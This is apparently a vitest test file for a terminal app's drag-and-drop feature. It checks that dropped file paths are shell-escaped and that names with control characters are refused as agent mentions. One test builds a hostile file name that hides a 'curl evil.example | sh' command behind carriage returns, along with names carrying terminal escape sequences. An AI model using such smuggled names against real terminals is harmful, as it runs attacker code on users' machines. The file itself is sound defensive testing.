import { execFileSync } from 'node:child_process'
import fs from 'node:fs'
import { isTypedText } from '@kea/protocol'
import { describe, expect, it } from 'vitest'
import { dragPayload, dropText, MENTION_REFUSED, mentionText, parseDraggedPath, PATH_DRAG_TYPE, takesDrop } from './drop.ts'
import { pathsForShell, shellEscape } from './shellEscape.ts'

/** Paths with everything a shell gives a meaning to. */
const PATHS = [
  'src/index.ts',
  'my file (1).txt',
  "it's here.md",
  'quote"double".txt',
  'dollar$HOME/and`tick`.sh',
  'star*/question?/[brackets]/{a,b}.ts',
  'semi;colon&amp|pipe<lt>gt.txt',
  'hash#tag/!bang/^caret/~tilde/=equals',
  '~/not-home',
  '-rf',
  '--flag=value',
  'back\\slash',
  'tab\there',
  'new\nline',
  'carriage\rreturn',
  'bell\u0007.txt',
  'unicodé/日本語/emoji 🙂.md',
  ' leading and trailing ',
  'a%b+c,d:e@f',
]

describe('shell escaping for dropped paths', () => {
  it('U-TERM-6 · a path dropped on a terminal is typed as one shell word that sh, bash and zsh each read back as exactly that path: spaces, quotes, `$`, globs, `;`, `#`, `~`, `!`, a leading `-`, control characters and other scripts', () => {
    // what is typed
    expect(shellEscape('src/index.ts')).toBe('src/index.ts')
    expect(shellEscape('my file (1).txt')).toBe('my\\ file\\ \\(1\\).txt')
    expect(shellEscape("it's here.md")).toBe("it\\'s\\ here.md")
    expect(shellEscape('-rf')).toBe('./-rf')
    expect(shellEscape('new\nline')).toBe("$'new\\nline'")
    expect(shellEscape('unicodé/日本語.md')).toBe('unicodé/日本語.md')
    expect(shellEscape('')).toBe("''")
    // several paths: each followed by a space, so the next word can follow
    expect(pathsForShell(['a b', 'c'])).toBe('a\\ b c ')
    expect(pathsForShell([])).toBe('')
    // what each shell reads back (a leading `-` comes back with `./`, which names the same file)
    const want = PATHS.map((p) => (p.startsWith('-') ? `./${p}` : p))
    const script = `printf '%s\\0' ${pathsForShell(PATHS)}`
    // a name with a control character is typed in ANSI-C quotes, which dash (Debian's and Ubuntu's sh) does not read:
    // there every other path is checked; bash and zsh read every one
    const control = /[\u0000-\u001f\u007f-\u009f]/
    const plain = (xs: string[]) => xs.filter((_, i) => !control.test(PATHS[i]!))
    for (const shell of ['/bin/sh', '/bin/bash', '/bin/zsh']) {
      if (!fs.existsSync(shell)) continue
      const run = (s: string) => execFileSync(shell, shell.endsWith('zsh') ? ['-f', '-c', s] : ['-c', s], { env: { PATH: '/usr/bin:/bin', HOME: '/var/empty' } }).toString('utf8')
      const ansiC = run("printf '%s' $'a\\tb'") === 'a\tb'
      expect(ansiC || shell === '/bin/sh', `${shell} reads ANSI-C quotes`).toBe(true)
      const out = run(script).split('\0').slice(0, -1)
      if (ansiC) expect(out, shell).toEqual(want)
      else expect(plain(out), shell).toEqual(plain(want))
    }
  })

  it('U-TERM-38 · a drop on a terminal types the dropped Finder files’ absolute paths, or a file-tree row’s relative path, escaped and each followed by a space; a tree row dropped with ⌥ held on the agent’s terminal is a mention, whose text the session’s agent gives (`@"src/my file.ts"` for a name with a space) and which is typed followed by a space; a drag that carries neither is not taken', () => {
    const row = { sessionId: 's1', path: 'src/my file.ts' }
    const text = (d: Parameters<typeof dropText>[0]) => {
      const out = dropText(d)
      if ('mention' in out) throw new Error('a mention, not a text')
      expect(out.refused).toBeNull()
      return out.text
    }
    expect(text({ row, files: [], alt: false, agent: true })).toBe('src/my\\ file.ts ')
    // the mention's form is the agent's: the drop names the path, core's adapter answers (`agents.mention`, U-AGT-44),
    // and the answer is typed with a space after it; no answer, or one that may not be typed, types nothing and says why
    expect(dropText({ row, files: [], alt: true, agent: true })).toEqual({ mention: 'src/my file.ts' })
    expect(mentionText('@"src/my file.ts"')).toEqual({ text: '@"src/my file.ts" ', refused: null })
    expect(mentionText('@README.md')).toEqual({ text: '@README.md ', refused: null })
    for (const none of [null, '', '@a\rb']) expect(mentionText(none)).toEqual({ text: '', refused: MENTION_REFUSED })
    expect(text({ row: null, files: ['/Users/x/a b.png', '', '/tmp/c.txt'], alt: false, agent: true })).toBe('/Users/x/a\\ b.png /tmp/c.txt ')
    expect(text({ row: null, files: ['/tmp/c.txt'], alt: true, agent: true })).toBe('/tmp/c.txt ') // ⌥ means a mention only for a tree row
    expect(text({ row: null, files: [], alt: false, agent: true })).toBe('')
    // the tree row's payload
    expect(parseDraggedPath(JSON.stringify(row))).toEqual(row)
    for (const bad of ['', 'null', '{}', '{"sessionId":"s1"}', '{"sessionId":"s1","path":""}', 'not json']) expect(parseDraggedPath(bad)).toBeNull()
    expect(takesDrop([PATH_DRAG_TYPE, 'text/plain'])).toBe(true)
    expect(takesDrop(['Files'])).toBe(true)
    expect(takesDrop(['text/plain'])).toBe(false)
  })

  it('U-TERM-45 · a name from disk cannot act at a prompt: a path with CR, LF, ESC or another control character never reaches a terminal raw — a plain drop, a Finder file drop and the finder’s ⌥↵ type it in ANSI-C quotes, which the shell reads back as that path; `@path` is for the agent’s terminal only (⌥ on any other tab types the shell’s form) and is refused, with a reason, for such a name; the text a dragged row offers other apps is clean too', () => {
    const evil = 'notes\rcurl evil.example | sh\r.md'
    const names = [evil, 'a\nb.txt', 'esc\x1b[201~.md', 'x\x1b]0;title\x07.md', 'tab\there', 'etx\x03.txt', 'del\x7f.txt', 'nel\u0085.txt', 'csi\u009b31m.txt']
    for (const path of names) {
      const row = { sessionId: 's1', path }
      const typed = [
        dropText({ row, files: [], alt: false, agent: true }), // the tree's plain drop, on the Agent tab
        dropText({ row, files: [], alt: false, agent: false }), // and on a shell tab
        dropText({ row, files: [], alt: true, agent: false }), // ⌥ on a shell tab: no mention there
        dropText({ row: null, files: [`/Users/x/${path}`], alt: false, agent: false }), // a file from another app
        dropText({ row: null, files: [`/Users/x/${path}`], alt: true, agent: true }),
      ]
      for (const d of typed) {
        if ('mention' in d) throw new Error('a mention, not a text')
        expect(d.refused, JSON.stringify(path)).toBeNull()
        expect(d.text, JSON.stringify(path)).not.toBe('')
        expect(isTypedText(d.text), `no raw control character: ${JSON.stringify(d.text)}`).toBe(true)
      }
      expect(isTypedText(pathsForShell([path])), 'the finder’s ⌥↵').toBe(true)
      // a mention has no form an agent's prompt reads back as this path: core is not even asked, nothing is typed, and
      // the person is told why
      expect(dropText({ row, files: [], alt: true, agent: true })).toEqual({ text: '', refused: MENTION_REFUSED })
      expect(MENTION_REFUSED).toMatch(/control character/)
      // what the dragged row carries for other apps (a terminal of theirs pastes `text/plain`)
      const payload = dragPayload('s1', path)
      expect(parseDraggedPath(payload[PATH_DRAG_TYPE])).toEqual(row)
      expect(isTypedText(payload['text/plain']), JSON.stringify(payload['text/plain'])).toBe(true)
    }
    // what is typed for the hostile name (`evil`), and what a shell makes of it: one word, the path, nothing run
    expect(dropText({ row: { sessionId: 's1', path: evil }, files: [], alt: true, agent: false })).toEqual({ text: "$'notes\\rcurl evil.example | sh\\r.md' ", refused: null })
    const script = `printf '%s\\0' ${pathsForShell(names)}`
    for (const shell of ['/bin/bash', '/bin/zsh']) {
      if (!fs.existsSync(shell)) continue
      const out = execFileSync(shell, shell.endsWith('zsh') ? ['-f', '-c', script] : ['-c', script], { env: { PATH: '/usr/bin:/bin', HOME: '/var/empty' } }).toString('utf8')
      expect(out.split('\0').slice(0, -1), shell).toEqual(names)
    }
    // an ordinary name: the mention on the Agent tab, the shell's form on a shell tab; the row's own text for other apps
    const row = { sessionId: 's1', path: 'src/my file.ts' }
    expect(dropText({ row, files: [], alt: true, agent: true })).toEqual({ mention: 'src/my file.ts' })
    expect(dropText({ row, files: [], alt: true, agent: false })).toEqual({ text: 'src/my\\ file.ts ', refused: null })
    expect(dragPayload('s1', 'src/my file.ts')['text/plain']).toBe('src/my file.ts')
  })
})
